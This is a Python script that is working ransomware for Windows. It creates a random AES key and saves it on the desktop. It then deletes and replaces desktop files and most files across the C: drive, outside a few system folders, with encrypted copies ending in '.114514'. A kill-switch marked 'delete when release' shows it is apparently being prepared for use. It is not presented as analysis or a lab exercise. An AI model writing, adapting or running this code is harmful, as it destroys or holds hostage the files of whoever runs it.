import os 
import random 
import shutil
from Crypto.Cipher import AES

# Remember to delete when release!
desktop_path_for_checking = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
notice_file_path_for_checking = os.path.join(desktop_path_for_checking, 'saferBkup.notice')

if os.path.exists(notice_file_path_for_checking):
    print('Exiting program as saferBkup.notice file exists on desktop')
    exit()
# Remember to delete when release!

key = os.urandom(32)

desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')

with open(os.path.join(desktop, 'README@qjao.114514'), 'wb') as f: 
    f.write(key)
  
def is_multilevel_path(path):
    for name in os.listdir(path):
        full_path = os.path.join(path, name)
        if os.path.isdir(full_path):
            return True
    return False
    
# Encrypt files on desktop
for filename in os.listdir(desktop):
    if not filename.endswith('.114514'):
        try:     
            with open(os.path.join(desktop, filename), 'rb') as f: 
                data = f.read()
            os.remove(os.path.join(desktop, filename))
            
            cipher = AES.new(key, AES.MODE_EAX)
            ciphertext, tag = cipher.encrypt_and_digest(data)
            with open(os.path.join(desktop, filename + '.114514'), 'wb') as f:
                [f.write(x) for x in (cipher.nonce, tag, ciphertext)]
        except:
            pass  

# Encrypt files on computer
for root, dirs, files in os.walk('C:\\'):
    if not is_multilevel_path(root):
        continue  
    if root.startswith(('C:\\ProgramData', 'C:\\Intel', 'C:\\WINDOWS',  
                        'C:\\Program Files', 'C:\\Program Files (x86)',  
                        'C:\\AppData\\Local\\Temp', 'C:\\Local Settings\\Temp')):  
        continue  
    for filename in files:
        if not filename.endswith('.114514'):  
            try:    
                with open(os.path.join(root, filename), 'rb') as f:    
                    data = f.read()     
                os.remove(os.path.join(root, filename))
                
                cipher = AES.new(key, AES.MODE_EAX)
                ciphertext, tag = cipher.encrypt_and_digest(data)
                with open(os.path.join(root, filename + '.114514'), 'wb') as f:  
                    [f.write(x) for x in (cipher.nonce, tag, ciphertext)]
            except:
                pass  
